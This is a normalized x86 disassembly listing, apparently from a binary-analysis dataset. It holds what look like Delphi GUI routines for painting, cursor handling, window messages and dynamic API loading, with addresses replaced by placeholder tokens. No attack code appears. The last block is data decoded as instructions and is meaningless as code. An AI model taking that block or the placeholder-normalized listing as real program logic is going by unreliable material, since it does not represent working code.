mov edx [ ebx + 0x50 ]
sub edx eax
mov [ esp ] edx
mov edx 0x1
mov eax esi
call sub_445664
mov [ esp + 0x4 ] eax
mov eax [ esp ]
add eax [ ebx + 0xc ]
mov [ esp + 0x8 ] eax
mov edx 0x1
mov eax [ ebx + 0x60 ]
call sub_4456d0
add eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
adc eax 0x0
mov edx [ ebx + 0x54 ]
sub edx eax
mov [ esp + 0x4 ] edx
mov edx 0x2
mov eax [ ebx + 0x60 ]
call sub_4456d0
add eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
add eax [ ebx + 0xc ]
mov [ esp + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x10 ]
call sub_41d618
push eax
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
mov esi eax
push 0x5a0049
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x8 ]
sub ecx edx
push ecx
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x8 ]
sub ecx eax
push ecx
push edx
push eax
mov eax [ ebx + 0x58 ]
push eax
call PatBlt
push esi
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
sub_44771c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x14 ]
cmp al [ edx + 0x10 ]
jne r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_44771c
pop ecx
mov eax ebx
call sub_445a98
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_445a98
cmp edi eax
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_44771c
pop ecx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_445a98
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4242a0
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
sub_4477ac
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_445a98
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_44561c
add esi eax
mov [ ebp - 0x8 ] esi
mov eax esi
call sub_445a98
mov [ ebp - 0x8 ] eax
jmp r-xdata
push ebp
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
call sub_44771c
pop ecx
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4477fc
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov bl 0x4
test esi esi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x10 ]
mov eax edi
call sub_43c8c0
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_43c8c0
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x1c ]
jg r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x20 ]
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jge r-xdata
mov eax [ ebp - 0x1c ]
add eax [ ebp - 0x14 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jl r-xdata
cmp eax [ ebp - 0xc ]
jg r-xdata
adc eax 0x0
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jl r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x2
mov bl 0x3
jmp r-xdata
sub_447878
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_445528
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
mov eax ebx
call sub_4455d4
mov edx [ ebx + 0x20 ]
sub edx eax
mov [ ebx + 0x24 ] edx
jmp r-xdata
mov eax ebx
call sub_445b7c
test eax eax
je r-xdata
mov eax esi
call sub_4455a0
test al al
jne r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_447620
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx + 0x14 ]
call sub_445e4c
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_445b7c
mov edx [ ebx + 0x20 ]
call sub_445ad4
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x14 ]
call sub_447878
pop ecx
sub_4478f8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
mov esi [ edi + 0x14 ]
test esi esi
je r-xdata
mov eax [ edi + 0x14 ]
call sub_445584
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x64 ]
je r-xdata
mov bl 0x1
jmp r-xdata
cmp [ edi + 0x24 ] 0x0
jne r-xdata
mov eax esi
call sub_445584
dec eax
jne r-xdata
test bl bl
je r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add eax [ edx + 0xc ]
add eax 0xe
mov [ ebp - 0x4 ] eax
mov eax edi
call sub_445b7c
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ edi + 0x14 ]
call sub_4478f8
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_447620
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ edi + 0x14 ]
call sub_445e4c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ edi + 0x14 ]
call sub_445780
mov eax edi
call sub_445b70
test eax eax
je r-xdata
mov eax edi
call sub_445b7c
mov esi eax
mov eax esi
call sub_445a98
push eax
mov eax esi
call sub_4455d4
pop edx
sub edx eax
sub edx [ edi + 0x24 ]
cmp edx [ ebp - 0x4 ]
jge r-xdata
mov eax edi
call sub_445b70
call sub_445a98
sub eax [ edi + 0x24 ]
cmp eax [ ebp - 0x4 ]
jge r-xdata
mov eax esi
call sub_445a98
mov edx eax
sub edx [ edi + 0x24 ]
mov eax esi
call sub_445ac0
mov eax esi
call sub_445a98
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_445ac0
mov eax edi
call sub_445b7c
call sub_445b10
jmp r-xdata
mov bl 0x1
jmp r-xdata
mov eax edi
call sub_4455d4
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_445ac0
mov eax edi
call sub_445b70
call sub_445b10
mov bl 0x1
jmp r-xdata
sub_447a30
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov ebx ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_445de4
test eax eax
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x10 ]
mov edx [ esi + 0x44 ]
mov eax [ esi + 0x40 ]
call sub_412ae8
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4465d8
test eax eax
je r-xdata
push ebp
call sub_447878
pop ecx
push ebp
call sub_4478f8
pop ecx
jmp r-xdata
xor ebx ebx
mov ebx [ eax + 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
push ebx
mov edx ebx
mov eax esi
call sub_4477fc
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
sub_447ab8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov eax [ edi ]
mov ebx [ eax + 0x18 ]
mov eax [ edi ]
mov esi [ eax + 0x60 ]
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax esi
mov edx 0x2
call sub_445664
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jl r-xdata
mov eax esi
mov edx 0x1
call sub_445664
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jl r-xdata
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_4477ac
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_4477ac
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x54 ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov edx [ edi ]
mov [ edx + 0x54 ] eax
jmp r-xdata
sub_447b48
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_447f20
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x202
jg r-xdata
sub eax 0x203
je r-xdata
je r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
call sub_4069fc
lea edx [ ebp - 0x44 ]
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_4465d8
mov esi eax
test esi esi
je r-xdata
sub eax 0xae2d
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
sub eax 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x32 ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx ebx
mov esi [ ebp - 0x4 ]
mov eax [ esi + 0x34 ]
call [ esi + 0x30 ]
cmp [ ebx + 0xc ] 0x0
jne r-xdata
sub eax 0x12
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_44757c
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_4069fc
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4465d8
mov esi eax
test esi esi
je r-xdata
lea eax [ ebp - 0xc ]
push eax
call GetCursorPos
lea ecx [ ebp - 0x44 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_43ca64
mov eax [ ebp - 0x44 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x8 ] eax
cmp [ ebx + 0x8 ] 0x1
jne r-xdata
sub eax 0x1e0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447f27
lea eax [ ebp - 0x48 ]
call sub_403fa8
retn
mov edx ebx
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
cmp [ ebp - 0x10 ] 0x2
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebx + 0x8 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov esi eax
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0xb00b
jne r-xdata
cmp [ ebp - 0x10 ] 0x14
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_443708
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
dec eax
je r-xdata
call sub_43b780
push 0x1
xor ecx ecx
xor edx edx
mov eax [ esi + 0x4 ]
call sub_43dc20
jmp r-xdata
test esi esi
je r-xdata
mov eax [ ebx + 0x8 ]
add eax 0x38
call sub_403fa8
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_447a30
jmp r-xdata
mov edi [ esi + 0x4 ]
mov eax edi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_442238
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_447630
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
call sub_4069fc
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x44 ]
mov [ eax + 0x50 ] edx
mov edx [ ebp - 0x40 ]
mov [ eax + 0x54 ] edx
push ebp
call sub_447ab8
pop ecx
mov eax [ ebp - 0x4 ]
call sub_447630
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_4069fc
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4465d8
mov esi eax
test esi esi
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax 0x2
je r-xdata
xor edx edx
mov eax edi
call sub_43ce40
jmp r-xdata
mov eax edi
call sub_4594b8
jmp r-xdata
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4465d8
mov esi eax
test esi esi
je r-xdata
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_43c8c0
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi ]
mov eax [ ebp - 0x20 ]
sub eax [ esi + 0x40 ]
add eax eax
sub [ ebp - 0x20 ] eax
mov eax [ ebp - 0x1c ]
sub eax [ esi + 0x44 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x18 ]
sub edx [ ebp - 0x20 ]
sub eax edx
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x1c ]
sub eax edx
add eax eax
sub [ ebp - 0x14 ] eax
lea edx [ ebp - 0x48 ]
mov eax esi
call sub_43cf20
mov edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
add eax 0x38
call sub_403ffc
mov eax [ ebx + 0x8 ]
lea edi [ eax + 0x18 ]
lea esi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
sub eax 0x12
jne r-xdata
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
cmp [ ebp - 0x10 ] 0x2
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44751c
jmp r-xdata
mov eax [ esi + 0x14 ]
movzx eax [ eax + 0x10 ]
movsx edx [ eax * 2 + rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45abb8
push eax
call SetCursor
mov [ ebx + 0xc ] 0x1
jmp r-xdata
push 0x0
push 0x203
push 0x203
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_443708
push eax
lea eax [ ebp - 0x3c ]
push eax
call PeekMessageA
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + 0x9b ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
cmp [ eax + 0x5d ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0xc4 ]
or ecx 0xffffffff
xor edx edx
call sub_43d5c8
jmp r-xdata
sub_447f30
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403228
mov [ esi + 0x4 ] 0x1
mov [ esi + 0x8 ] 0x5
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jge r-xdata
xor eax eax
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov al 0x1
mov [ esi + 0xd ] al
xor edx edx
mov eax esi
call sub_4480a4
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
mov eax [ rw-data ]
cmp [ eax ] 0xa
jge r-xdata
sub_447fc0
push ebx
push esi
call sub_4035e4
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44807c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403248
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
sub_448024
push ebx
push esi
mov esi eax
push 0x4b
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x20 ] bl
test bl bl
je r-xdata
pop esi
pop ebx
retn
push 0x0
lea eax [ esi + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
sub_448054
push ebx
push ecx
mov ebx eax
push esp
lea eax [ ebx + 0x10 ]
push eax
lea ecx [ ebx + 0x14 ]
lea edx [ ebx + 0x24 ]
lea eax [ ebx + 0x1c ]
call sub_406af0
mov [ ebx + 0x18 ] eax
cmp [ ebx + 0x1c ] 0x0
setne al
mov [ ebx + 0x20 ] al
pop edx
pop ebx
retn
sub_44807c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_447ff0
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
jne r-xdata
push esi
call SetCapture
call ReleaseCapture
jmp r-xdata
sub_4480a4
push ebx
mov ebx eax
sub edx 0x1
jb r-xdata
mov eax ebx
call sub_448008
cmp [ ebx + 0xd ] 0x0
jne r-xdata
sub edx 0x67
je r-xdata
mov eax ebx
call sub_448024
pop ebx
retn
mov eax ebx
call sub_448054
jmp r-xdata
cmp [ ebx + 0x20 ] 0x0
je r-xdata
jmp r-xdata
pop ebx
retn
cmp [ ebx + 0xd ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
call SendMessageA
mov [ ebx + 0x10 ] eax
push 0x0
lea eax [ ebx + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
jmp r-xdata
sub_448108
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
push 0x8000
call SetErrorMode
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44826e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
call GetModuleHandleA
mov ebx eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call SetErrorMode
retn
push r-xdata
call LoadLibraryA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_44838c
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp bl 0x3
je r-xdata
test bl bl
jne r-xdata
mov dl 0x1
mov eax esi
call sub_448370
cmp [ rw-data ] 0x0
je r-xdata
xor edx edx
mov eax esi
call sub_448370
jmp r-xdata
push esi
call [ rw-data ]
mov edi eax
test edi edi
je r-xdata
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax ebx
dec al
je r-xdata
push 0x0
push edi
call [ rw-data ]
jmp r-xdata
dec al
je r-xdata
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
push edi
push esi
call [ rw-data ]
push 0x1
push edi
call [ rw-data ]
jmp r-xdata
jmp r-xdata
push 0x1
push edi
call [ rw-data ]
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax [ esp ]
and eax 0xfffffff4
xor edx edx
mov dl bl
movzx edx [ edx + rw-data ]
or eax edx
mov [ esp ] eax
sub_44847c
mov eax [ rw-data ]
mov eax [ eax ]
call sub_403258
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
mov eax [ eax ]
call sub_403258
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
call sub_403258
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_403258
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_403fa8
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_403fa8
cmp [ rw-data ] 0x0
je r-xdata
retn
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_448504
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44867c
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetCurrentProcessId
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea edx [ ebp - 0xc ]
xor ecx ecx
mov eax r-xdata
call sub_408db8
mov edx [ ebp - 0x4 ]
mov eax rw-data
call sub_403ffc
mov eax [ rw-data ]
call sub_404468
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0x0
call GetCurrentThreadId
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
lea edx [ ebp - 0x20 ]
mov ecx 0x1
mov eax r-xdata
call sub_408db8
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_403ffc
mov eax [ rw-data ]
call sub_404468
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
mov eax [ rw-data ]
call sub_404468
push eax
call RegisterWindowMessageA
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_414158
mov [ rw-data ] eax
call sub_448108
mov dl 0x1
mov eax [ r-xdata ]
call sub_447f30
mov [ rw-data ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_45a494
mov edx [ rw-data ]
mov [ edx ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_45b578
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov dl 0x1
call sub_45d160
mov ecx r-xdata
mov edx sub_439fdc
mov eax [ r-xdata ]
call sub_41390c
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448683
lea eax [ ebp - 0x10 ]
call sub_403fa8
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_4486ec
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_44874b
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448752
retn
mov eax rw-data
call sub_40d250
call sub_44847c
mov eax rw-data
mov ecx 0x16
mov edx [ r-xdata ]
call sub_404a30
mov eax rw-data
call sub_403fa8
mov eax rw-data
call sub_403fa8
sub_448754
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4487da
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4487e1
retn
call GetVersion
and eax 0xff
cmp ax 0x4
setae [ rw-data ]
call sub_448504
mov eax [ r-xdata ]
call sub_413780
mov eax [ r-xdata ]
call sub_413820
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4137cc
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4137cc
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4137cc
sub_448990
stc
push ebx
push eax
push [ eax - 0x7ffbb71 ]
pop [ eax + eax - 0x4 ]
xchg ecx eax
inc esp
add [ edx + edx * 4 ] bl
inc esp
add [ ecx ] dl
push esp
inc ebx
jne r-xdata
inc eax
je r-xdata
add [ edx + esi ] cl
inc ebx
jne r-xdata
mov ah 0x34
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
pop es
adc [ ebx + eax * 2 + 0x75 ] edx
jae r-xdata
add [ eax ] al
xchg esp eax
adc [ eax ] al
jl r-xdata
inc eax
add [ eax - 0x27ffbb6d ] cl
xchg ebx eax
inc esp
add [ ebp + ebx * 4 + 0x45000041 ] ah
inc ecx
add [ esi + ebx * 4 + 0x41 ] bh
dec esp
imul esi [ ebx + 0x74 ] 0x8adcc08b
inc esp
add [ edi ] al
or eax 0x6f685354
jb r-xdata
add [ ecx + ecx * 2 ] dl
inc ecx
add al dh
push edi
inc ecx
add [ eax + ebx * 2 ] ah
inc ecx
add [ eax ] ch
pop eax
inc ecx
add [ eax + ebx * 2 ] ch
inc ecx
add [ eax ] al
dec ebp
inc ecx
add [ eax - 0x3ffbea7 ] ah
pop ecx
inc ecx
add al dl
pop edx
inc ecx
add al al
push ebx
inc ecx
add [ ebx + ebx * 2 ] cl
inc ecx
add [ eax - 0x53ffbea5 ] al
cdq
inc esp
add [ eax + 0x5c004155 ] dh
dec eax
inc ecx
add [ esi + edx * 2 + 0x41 ] cl
add [ esi + edx * 2 + 0x56f80041 ] cl
inc ecx
add [ esp + ecx * 2 + 0x58880041 ] ch
inc ecx
add [ esi + ecx * 2 + 0x4f880041 ] dh
inc ecx
add ah al
pop eax
inc ecx
add ah dl
pop eax
inc ecx
add ah ch
dec edi
inc ecx
add [ eax + 0x50 ] al
inc ecx
add ah ch
push eax
inc ecx
add [ edx + edx * 2 + 0x52dc0041 ] al
inc ecx
add [ eax + 0x53 ] dh
inc ecx
add [ esi + edx * 2 ] dl
inc ecx
add [ eax ] dh
push esi
inc ecx
add [ eax ] ch
pop ecx
inc ecx
add [ eax + 0x57 ] bh
inc ecx
add [ eax ] bh
pop ebx
inc ecx
add [ eax + 0x5b ] cl
inc ecx
add [ 0x6f685354 ] cl
jb r-xdata
add [ eax - 0xfffbfcc ] ch
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x55 ] cl
inc ecx
add ah ah
inc ebp
inc ecx
add [ edx + ecx * 2 ] bl
inc ecx
outsd
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
or al 0x29
inc ecx
add [ edx ] al
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0x8a300000
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
mov al [ eax + eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
mov al [ eax + eax + 0x30 ]
add [ eax ] al
